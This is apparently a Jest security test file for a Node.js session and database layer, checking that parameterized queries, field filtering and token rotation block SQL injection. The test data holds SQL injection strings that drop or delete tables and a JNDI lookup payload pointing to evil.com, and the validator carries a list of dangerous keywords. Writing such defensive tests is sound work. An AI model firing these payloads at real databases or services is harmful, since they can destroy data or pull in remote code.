/**
 * Security tests for SQL injection prevention
 * 
 * Note: SessionManager tests use a mock database to avoid requiring a real DB connection.
 * The DatabaseManager tests use the real DatabaseManager but skip tests if DB is not available.
 */

const DatabaseManager = require('../src/db/databaseManager');
const SessionManager = require('../src/network/sessionManager');

// Helper to create a mock database for SessionManager tests
function createMockDb() {
    const users = new Map();
    let nextId = 1;
    
    return {
        connected: true,
        query: jest.fn(async (text, params = []) => {
            // Simulate parameterized query behavior
            if (text.includes('SELECT * FROM users WHERE anon_token')) {
                const token = params[0];
                const user = Array.from(users.values()).find(u => u.anon_token === token);
                return { rows: user ? [user] : [] };
            }
            if (text.includes('SELECT * FROM users WHERE socket_id')) {
                const socketId = params[0];
                const user = Array.from(users.values()).find(u => u.socket_id === socketId);
                return { rows: user ? [user] : [] };
            }
            if (text.includes('SELECT * FROM users WHERE id')) {
                const id = params[0];
                const user = users.get(id);
                return { rows: user ? [user] : [] };
            }
            if (text.includes('INSERT INTO users')) {
                const id = nextId++;
                const newUser = {
                    id,
                    socket_id: params[0],
                    ip_address: params[1],
                    anon_token: params[2],
                    credits: 0,
                    payout_address: null,
                    created_at: new Date(),
                    last_seen: new Date()
                };
                users.set(id, newUser);
                return { rows: [newUser] };
            }
            if (text.includes('UPDATE users SET socket_id')) {
                const socketId = params[0];
                const userId = params[1];
                const user = users.get(userId);
                if (user) {
                    user.socket_id = socketId;
                    user.last_seen = new Date();
                }
                return { rows: user ? [user] : [] };
            }
            if (text.includes('UPDATE users SET') && text.includes('WHERE id')) {
                // Generic update - extract id from last param
                const userId = params[params.length - 1];
                const user = users.get(userId);
                if (user) {
                    // Parse SET clause - simplified for test
                    if (text.includes('credits =')) {
                        const creditsIdx = params.findIndex((_, i) => text.includes(`credits = $${i + 1}`));
                        if (creditsIdx >= 0) user.credits = params[creditsIdx];
                    }
                    if (text.includes('payout_address =')) {
                        const addrIdx = params.findIndex((_, i) => text.includes(`payout_address = $${i + 1}`));
                        if (addrIdx >= 0) user.payout_address = params[addrIdx];
                    }
                    if (text.includes('anon_token =')) {
                        user.anon_token = params[0];
                    }
                }
                return { rows: user ? [user] : [] };
            }
            if (text.includes('SELECT') && text.includes('payments')) {
                return { rows: [] }; // No pending payments
            }
            return { rows: [] };
        }),
        buildParameterizedQuery: (template, values) => {
            // Real implementation from DatabaseManager
            const params = [];
            let paramIndex = 1;
            const text = template.replace(/:([a-zA-Z_][a-zA-Z0-9_]*)/g, (match, name) => {
                if (!(name in values)) {
                    throw new Error(`Missing parameter: ${name}`);
                }
                params.push(values[name]);
                return `$${paramIndex++}`;
            });
            return { text, params };
        },
        safeQuery: async function(template, values) {
            const { text, params } = this.buildParameterizedQuery(template, values);
            return this.query(text, params);
        },
        queryValidator: {
            isSafe: (query, params) => {
                // Check for parameter count mismatch
                const placeholders = (query.match(/\$\d+/g) || []);
                const maxPlaceholder = placeholders.reduce((max, p) => {
                    const num = parseInt(p.substring(1));
                    return Math.max(max, num);
                }, 0);
                
                if (maxPlaceholder !== params.length) {
                    console.warn('⚠️ Parameter count mismatch in query');
                    return false;
                }
                
                // Check for dangerous keywords
                const dangerousKeywords = ['DROP', 'TRUNCATE', 'DELETE FROM'];
                for (const keyword of dangerousKeywords) {
                    if (query.toUpperCase().includes(keyword)) {
                        console.warn(`⚠️ Potentially dangerous keyword "${keyword}" in query`);
                    }
                }
                
                return true;
            }
        }
    };
}

describe('SQL Injection Prevention', () => {
    let db;
    let realDb;
    let sessionManager;
    let dbAvailable = false;

    beforeAll(async () => {
        // Only attempt a real DB connection when a usable password is configured. Without one,
        // node-postgres throws inside the SASL handshake *after* opening the TCP socket and
        // orphans that socket (it survives pool.end()), which would keep Jest from exiting. A
        // missing password simply means "DB not available" here — and these tests already fall
        // back to mocks in that case.
        const hasDbPassword = typeof process.env.DB_PASSWORD === 'string' && process.env.DB_PASSWORD.length > 0;
        if (hasDbPassword) {
            // Try to connect to real DB for DatabaseManager tests
            realDb = new DatabaseManager();
            await realDb.initialize();
            // Check if connection was successful (initialize doesn't throw, it returns silently)
            dbAvailable = realDb.connected === true;
        }

        if (!dbAvailable) {
            console.log('⚠️ Database not available, DatabaseManager tests will use mocks');
        }
        
        // Use mock DB for SessionManager tests
        db = createMockDb();
        
        const mockDebugManager = {
            CONSOLE_LOGGING: false
        };
        
        sessionManager = new SessionManager({
            db: db,
            debugManager: mockDebugManager,
            gameModeManager: null
        });
        
        await sessionManager.initialize();
    });

    afterAll(async () => {
        if (sessionManager) {
            sessionManager.dispose();
        }
        // Always close the pool: initialize() creates it even when the connection fails, so
        // gating on dbAvailable would leak the pg pool handle and keep Jest from exiting.
        if (realDb) {
            try { await realDb.close(); } catch (_) {}
        }
    });

    describe('DatabaseManager Security', () => {
        test('should reject queries with parameter mismatch', async () => {
            if (!dbAvailable) {
                // Use mock to test query validation logic
                const mockValidator = db.queryValidator;
                const isValid = mockValidator.isSafe('SELECT * FROM users WHERE id = $1 AND name = $2', [1]);
                expect(isValid).toBe(false); // Should detect mismatch
                return;
            }
            const badQuery = 'SELECT * FROM users WHERE id = $1 AND name = $2';
            const params = [1]; // Missing second parameter

            await expect(realDb.query(badQuery, params)).rejects.toThrow('Potentially unsafe query detected');
        });

        test('should safely build parameterized queries', () => {
            // This test can use the mock db since buildParameterizedQuery is a pure function
            const template = 'SELECT * FROM users WHERE id = :userId AND status = :status';
            const values = { userId: 1, status: 'active' };

            const { text, params } = db.buildParameterizedQuery(template, values);

            expect(text).toBe('SELECT * FROM users WHERE id = $1 AND status = $2');
            expect(params).toEqual([1, 'active']);
        });

        test('should handle missing parameters safely', () => {
            // This test can use the mock db since buildParameterizedQuery is a pure function
            const template = 'SELECT * FROM users WHERE id = :userId';
            const values = {}; // Missing userId

            expect(() => {
                db.buildParameterizedQuery(template, values);
            }).toThrow('Missing parameter: userId');
        });

        test('should execute safe queries using safeQuery helper', async () => {
            // Use mock DB for this test
            const template = 'SELECT COUNT(*) as count FROM users WHERE socket_id = :socketId';
            const values = { socketId: 'test-socket-safe' };

            const result = await db.safeQuery(template, values);
            expect(result.rows).toBeDefined();
        });
    });

    describe('SessionManager Security', () => {
        test('should safely handle malicious token input', async () => {
            const maliciousTokens = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' OR 1=1--",
                "'; DELETE FROM users WHERE 1=1; --",
                "UNION SELECT * FROM users--",
                "${jndi:ldap://evil.com/a}"
            ];

            for (const token of maliciousTokens) {
                const result = await sessionManager.resumeOrCreate({
                    socketId: `test-socket-${Math.random()}`,
                    ipAddress: '127.0.0.1',
                    resumeToken: token
                });

                // Should create new user, not execute injection
                expect(result.resumed).toBe(false);
                expect(result.user).toBeDefined();
                expect(result.token).toBeTruthy();
                expect(result.token).not.toBe(token); // Should generate new token
            }
        });

        test('should rotate the session token on resume (bearer-token replay protection)', async () => {
            // Create a session to obtain a real token.
            const created = await sessionManager.resumeOrCreate({
                socketId: 'rotate-socket-1',
                ipAddress: '127.0.0.1',
                resumeToken: null
            });
            expect(created.resumed).toBe(false);
            const firstToken = created.token;
            expect(firstToken).toBeTruthy();

            // Resume with that token — should succeed and hand back a DIFFERENT token.
            const resumed = await sessionManager.resumeOrCreate({
                socketId: 'rotate-socket-2',
                ipAddress: '127.0.0.1',
                resumeToken: firstToken
            });
            expect(resumed.resumed).toBe(true);
            expect(resumed.token).toBeTruthy();
            expect(resumed.token).not.toBe(firstToken); // rotated

            // The OLD token must no longer resume (it was invalidated).
            const replay = await sessionManager.resumeOrCreate({
                socketId: 'rotate-socket-3',
                ipAddress: '127.0.0.1',
                resumeToken: firstToken
            });
            expect(replay.resumed).toBe(false);
        });

        test('should safely handle malicious socket ID', async () => {
            const maliciousSocketId = "'; DROP TABLE users; --";
            
            const result = await sessionManager.getBySocket(maliciousSocketId);
            
            // Should return null, not execute injection
            expect(result).toBeNull();
        });

        test('should safely update user with controlled fields', async () => {
            // First create a test user
            const testSession = await sessionManager.resumeOrCreate({
                socketId: 'test-update-socket',
                ipAddress: '127.0.0.1',
                resumeToken: null
            });

            // Test safe updates
            const safeUpdates = {
                credits: 100,
                payout_address: 'WW1234567890123456789012345678901234567890123456789012345678901234567890123456789012345',
            };

            await expect(sessionManager.updateUser(testSession.user.id, safeUpdates))
                .resolves.not.toThrow();

            // Test that dangerous fields are ignored
            const dangerousUpdates = {
                id: 999999,  // Should be ignored
                socket_id: "'; DROP TABLE users; --", // Should be ignored
                credits: 50   // Should be allowed
            };

            await expect(sessionManager.updateUser(testSession.user.id, dangerousUpdates))
                .resolves.not.toThrow();

            // Verify only safe fields were updated
            const updatedUser = await sessionManager.getBySocket('test-update-socket');
            expect(updatedUser.credits).toBe(50);
            expect(updatedUser.id).not.toBe(dangerousUpdates.id); // Should ignore malicious id change
            expect(updatedUser.socket_id).toBe('test-update-socket');
        });

        test('should generate cryptographically secure tokens', () => {
            const tokens = new Set();
            
            // Generate 100 tokens and ensure they're all unique
            for (let i = 0; i < 100; i++) {
                const token = sessionManager.generateSecureToken();
                expect(token).toBeTruthy();
                expect(typeof token).toBe('string');
                expect(token.length).toBeGreaterThan(40); // Base64url encoded 32 bytes should be 43+ chars
                expect(tokens.has(token)).toBe(false); // Should be unique
                tokens.add(token);
            }
        });
    });

    describe('Query Validation', () => {
        test('should warn about dangerous keywords in non-migration context', () => {
            const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            // This should trigger a warning but not block the query
            const dangerousQuery = 'SELECT * FROM users; DROP TABLE test_table;';
            const isValid = db.queryValidator.isSafe(dangerousQuery, []);
            
            expect(isValid).toBe(true); // Still allows but warns
            expect(consoleSpy).toHaveBeenCalledWith(
                expect.stringContaining('Potentially dangerous keyword "DROP" in query')
            );
            
            consoleSpy.mockRestore();
        });

        test('should detect parameter count mismatches', () => {
            const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            const isValid = db.queryValidator.isSafe('SELECT * FROM users WHERE id = $1 AND name = $2', [1]);
            
            expect(isValid).toBe(false);
            expect(consoleSpy).toHaveBeenCalledWith('⚠️ Parameter count mismatch in query');
            
            consoleSpy.mockRestore();
        });
    });
});

module.exports = {
    // Export for potential use in other test files
    createTestUser: async (db) => {
        const result = await db.query(
            'INSERT INTO users (socket_id, ip_address, anon_token) VALUES ($1, $2, $3) RETURNING *',
            ['test-socket', '127.0.0.1', 'test-token']
        );
        return result.rows[0];
    }
};